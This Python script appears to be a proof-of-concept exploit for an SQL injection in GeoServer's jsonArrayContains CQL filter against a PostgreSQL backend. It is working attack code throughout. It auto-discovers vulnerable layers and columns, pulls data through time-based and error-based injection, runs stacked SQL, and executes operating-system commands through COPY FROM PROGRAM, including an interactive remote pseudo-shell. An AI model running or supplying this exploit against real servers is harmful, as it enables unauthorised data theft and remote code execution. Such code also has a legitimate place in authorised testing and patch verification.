#!/usr/bin/env python3
"""
GeoServer jsonArrayContains SQLi -> PostgreSQL RCE / SQL / exfiltration PoC
"""
import argparse
import ssl
import sys
import time
import urllib.error
import urllib.parse
import urllib.request
import xml.etree.ElementTree as ET

DELAY = 4
MIN_DELAY = DELAY - 1.5


def build_cql(prop, inject):
    return f"jsonArrayContains(\"{prop}\", '/a', '{inject}') = true"


def build_url(base_url, typename, cql):
    qs = urllib.parse.urlencode({
        "service": "wfs",
        "version": "1.0.0",
        "request": "GetFeature",
        "typeName": typename,
        "CQL_FILTER": cql,
    }, quote_via=urllib.parse.quote)
    return f"{base_url.rstrip('/')}/ows?{qs}"


def fire(url, timeout):
    proxy_handler = urllib.request.ProxyHandler({'http': 'http://127.0.0.1:8011', 'https': 'http://127.0.0.1:8011'})
    opener = urllib.request.build_opener(proxy_handler)
    urllib.request.install_opener(opener)
    req = urllib.request.Request(url, headers={"User-Agent": "poc"})
    t0 = time.time()
    # Adding SSL unverified context here as well for completeness if needed later
    ctx = ssl._create_unverified_context() if url.lower().startswith("https") else None
    try:
        with urllib.request.urlopen(req, timeout=timeout, context=ctx) as r:
            r.read()
    except Exception:
        pass
    return time.time() - t0


def probe(args, expr, label=""):
    inject = f"x\")'') OR (SELECT * FROM (SELECT pg_sleep(CASE WHEN {expr} THEN {DELAY} ELSE 0 END)) a) IS NOT NULL OR (''1''=''1"
    cql = build_cql(args.col, inject)
    secs = fire(build_url(args.url, args.layer, cql), DELAY + 8)
    if label:
        print(f"      {label[:42]:<42} -> {secs:.2f}s")
    return secs >= MIN_DELAY


def extract_string(probe_func, expr, label, maxlen=64):
    out = []
    print(f"[+] {label} = ", end="", flush=True)
    for pos in range(1, maxlen + 1):
        lo, hi = 32, 126
        while lo < hi:
            mid = (lo + hi) // 2
            cond = f"ascii(substr(({expr})::text,{pos},1)) > {mid}"
            if probe_func(cond):
                lo = mid + 1
            else:
                hi = mid
        if lo == 32:
            break
        out.append(chr(lo))
        print(chr(lo), end="", flush=True)
    s = "".join(out)
    print()
    return s


def verify_stack(args):
    inject = f"x\")'') ) ; SELECT pg_sleep({DELAY}) ; --"
    cql = build_cql(args.col, inject)
    secs = fire(build_url(args.url, args.layer, cql), DELAY + 8)
    print(f"[verify-stack] {secs:.2f}s")
    return secs >= MIN_DELAY


def mode_shell(args):
    if "'" in args.cmd:
        sys.exit("[-] command must not contain single quotes")
    
    table_name = "cmd_out_tmp"
    
    print(f"[+] executing: {args.cmd}")
    print("[*] Step 1: Sending RCE payload and saving output to DB...")
    # Using COMMIT to bypass transaction rollback on error
    exec_sql = f"COMMIT; DROP TABLE IF EXISTS {table_name}; CREATE TABLE {table_name}(output text); COPY {table_name}(output) FROM PROGRAM ''{args.cmd}''; COMMIT;"
    inject_exec = f"x\")'') ) ; {exec_sql} --"
    
    cql_exec = build_cql(args.col, inject_exec)
    url_exec = build_url(args.url, args.layer, cql_exec)
    
    fire(url_exec, 30)
    
    print("[*] Step 2: Extracting output via Error-based SQLi (Hex Encoded)...")
    # string_agg is used because COPY FROM PROGRAM creates a new row for each line of output
    # We encode it to hex to avoid XML parsing issues with special characters from OS commands
    error_sql = f"chr(126)||(SELECT encode(convert_to(COALESCE(string_agg(output, chr(10)), ''[Empty Output]''), ''UTF8''), ''hex'') FROM {table_name})||chr(126)"
    inject_error = f"x\")'') AND CAST((SELECT {error_sql}) AS NUMERIC)=1 OR (''1''=''1"
    
    cql_error = build_cql(args.col, inject_error)
    url_error = build_url(args.url, args.layer, cql_error)
    
    proxy_handler = urllib.request.ProxyHandler({'http': 'http://127.0.0.1:8011', 'https': 'http://127.0.0.1:8011'})
    opener = urllib.request.build_opener(proxy_handler)
    urllib.request.install_opener(opener)
    req = urllib.request.Request(url_error, headers={"User-Agent": "poc"})
    
    ctx = ssl._create_unverified_context() if args.insecure and url_error.lower().startswith("https") else None
    try:
        with urllib.request.urlopen(req, timeout=15, context=ctx) as r:
            body = r.read().decode()
            if "invalid input syntax for type numeric" in body:
                import re
                m = re.search(r'invalid input syntax for type numeric: &quot;([^&]+)&quot;', body)
                if m:
                    # Strip the ~ wrapper we added via chr(126)
                    hex_out = m.group(1).strip("~")
                    try:
                        out = bytes.fromhex(hex_out).decode('utf-8')
                        print(f"[+] Command Output:\n\033[96m{out}\033[0m")
                    except Exception as hex_err:
                        print(f"[-] Failed to decode hex output '{hex_out}': {hex_err}")
                else:
                    print("[-] Command executed, but couldn't parse the output from the error.")
            else:
                print("[-] Command executed, but didn't receive a database error during extraction.")
    except urllib.error.HTTPError as e:
        print(f"[-] HTTP Error {e.code} during extraction.")
    except Exception as e:
        print(f"[-] Error during extraction: {e}")


def mode_sql(args):
    inject = f"x\")'') ) ; {args.stack_sql} ; --"
    cql = build_cql(args.col, inject)
    url = build_url(args.url, args.layer, cql)
    
    print(f"[+] SQL: {args.stack_sql}")
    fire(url, 30)
    print("[*] sent - blind, verify side effects in the database")


def mode_error(args):
    print(f"[*] Extracting data using Error-based SQLi: {args.error_sql}")
    inject = f"x\")'') AND CAST((SELECT {args.error_sql}) AS NUMERIC)=1 OR (''1''=''1"
    cql = build_cql(args.col, inject)
    url = build_url(args.url, args.layer, cql)
    
    proxy_handler = urllib.request.ProxyHandler({'http': 'http://127.0.0.1:8011', 'https': 'http://127.0.0.1:8011'})
    opener = urllib.request.build_opener(proxy_handler)
    urllib.request.install_opener(opener)
    req = urllib.request.Request(url, headers={"User-Agent": "poc"})
    
    ctx = ssl._create_unverified_context() if args.insecure and url.lower().startswith("https") else None
    try:
        with urllib.request.urlopen(req, timeout=15, context=ctx) as r:
            body = r.read().decode()
            if "invalid input syntax for type numeric" in body:
                import re
                m = re.search(r'invalid input syntax for type numeric: &quot;([^&]+)&quot;', body)
                if m:
                    print(f"[+] Error-Based Extraction Success!")
                    print(f"[+] Result: \033[92m{m.group(1)}\033[0m")
                else:
                    print("[-] Found error signature but couldn't parse the output.")
            else:
                print("[-] Exploit failed. Did not receive a database error.")
    except urllib.error.HTTPError as e:
        print(f"[-] Exploit failed. HTTP Error {e.code}")
    except Exception as e:
        print(f"[-] Error: {e}")


def mode_timebased(args):
    print(f"[*] Extracting data using Time-based SQLi: {args.time_sql}")
    probe_func = lambda cond: probe(args, cond)
    extract_string(probe_func, args.time_sql, "Result")


# ---------------------------------------------------------------------------
# Recon 
# ---------------------------------------------------------------------------

def local_name(tag):
    return tag.split("}")[-1] if "}" in tag else tag


def http_get(url, timeout, insecure):
    proxy_handler = urllib.request.ProxyHandler({'http': 'http://127.0.0.1:8011', 'https': 'http://127.0.0.1:8011'})
    opener = urllib.request.build_opener(proxy_handler)
    urllib.request.install_opener(opener)
    req = urllib.request.Request(url, headers={"User-Agent": "poc"})
    ctx = ssl._create_unverified_context() if insecure and url.lower().startswith("https") else None
    try:
        with urllib.request.urlopen(req, timeout=timeout, context=ctx) as r:
            return r.read()
    except Exception as e:
        print(f"[-] http_get failed for {url}: {e}")
        return None


def get_ows(base_url, params, timeout, insecure):
    qs = urllib.parse.urlencode(params, quote_via=urllib.parse.quote)
    data = http_get(f"{base_url.rstrip('/')}/ows?{qs}", timeout, insecure)
    if not data:
        return None
    try:
        return ET.fromstring(data)
    except ET.ParseError:
        return None


def get_public_typenames(base_url, timeout, insecure):
    for version in ("2.0.0", "1.1.0", "1.0.0"):
        root = get_ows(base_url, {"service": "wfs", "version": version, "request": "GetCapabilities"}, timeout, insecure)
        if root is None or local_name(root.tag) in ("ServiceExceptionReport", "ExceptionReport"):
            continue
            
        names = []
        for el in root.iter():
            if local_name(el.tag) == "FeatureType":
                for child in el:
                    if local_name(child.tag) == "Name" and child.text:
                        names.append(child.text.strip())
                        break
        if names:
            return names
    return []


def get_columns(base_url, typename, timeout, insecure):
    root = get_ows(base_url, {"service": "wfs", "version": "2.0.0", "request": "DescribeFeatureType", "typeName": typename}, timeout, insecure)
    if root is None:
        return []
        
    columns = []
    for el in root.iter():
        if local_name(el.tag) == "element":
            name = el.get("name")
            if name and el.get("type") and el.get("substitutionGroup") is None:
                columns.append(name)
    return columns


def detect_target(args):
    print(f"[*] auto-detecting layer/column via {args.url} ...")

    typenames = [args.layer] if args.layer else get_public_typenames(args.url, args.recon_timeout, args.insecure)
    if not typenames:
        print("[-] no public layer found")
        return False

    for tn in typenames:
        columns = [args.col] if args.col else get_columns(args.url, tn, args.recon_timeout, args.insecure)
        if not columns:
            continue
            
        probe_args = argparse.Namespace(**vars(args))
        probe_args.layer = tn
        for col in columns:
            probe_args.col = col
            print(f"    trying layer={tn} col={col} ...")
            
            if probe(probe_args, "1=1") and not probe(probe_args, "1=0"):
                print(f"[+] confirmed layer={tn} col={col}")
                args.layer, args.col = tn, col
                return True
    return False


def main():
    ap = argparse.ArgumentParser(description="GeoServer jsonArrayContains SQLi PoC")
    ap.add_argument("-u", "--url", required=True, help="GeoServer URL (e.g. http://localhost:8080/geoserver)")
    ap.add_argument("--layer", help="WFS layer type name (auto-detected if omitted)")
    ap.add_argument("--col", help="json/jsonb column (auto-detected if omitted)")
    ap.add_argument("--recon-timeout", type=int, default=15, help="HTTP timeout for recon")
    ap.add_argument("--insecure", action="store_true", help="disable TLS verification")
    
    g = ap.add_mutually_exclusive_group(required=True)
    g.add_argument("-c", dest="cmd", help="OS command to execute (needs superuser)")
    g.add_argument("-i", "--interactive", action="store_true", help="Start an interactive pseudo-shell (needs superuser)")
    g.add_argument("-s", dest="stack_sql", help="Arbitrary SQL to run via stacked query")
    g.add_argument("-t", dest="time_sql", help="Extract data using Time-based SQLi (e.g. \"select version()\")")
    g.add_argument("-e", dest="error_sql", help="Extract data using Error-based SQLi (e.g. \"select version()\")")
    
    args = ap.parse_args()

    # Pre-flight check for interactive mode so it doesn't fail midway
    if args.interactive:
        args.cmd = "echo Interactive Shell Started"

    if not args.layer or not args.col:
        if not detect_target(args):
            sys.exit("[-] auto-detect failed")

    if args.interactive:
        print("[+] Entering interactive pseudo-shell. Type 'exit' or 'quit' to stop.")
        while True:
            try:
                cmd = input("geoserver> ")
                if cmd.strip().lower() in ['exit', 'quit']:
                    break
                if not cmd.strip():
                    continue
                args.cmd = cmd
                mode_shell(args)
            except KeyboardInterrupt:
                print("\n[+] Exiting...")
                break
            except Exception as e:
                print(f"[-] Error: {e}")
    elif args.cmd:
        mode_shell(args)
    elif args.stack_sql:
        mode_sql(args)
    elif args.error_sql:
        mode_error(args)
    elif args.time_sql:
        mode_timebased(args)


if __name__ == "__main__":
    main()
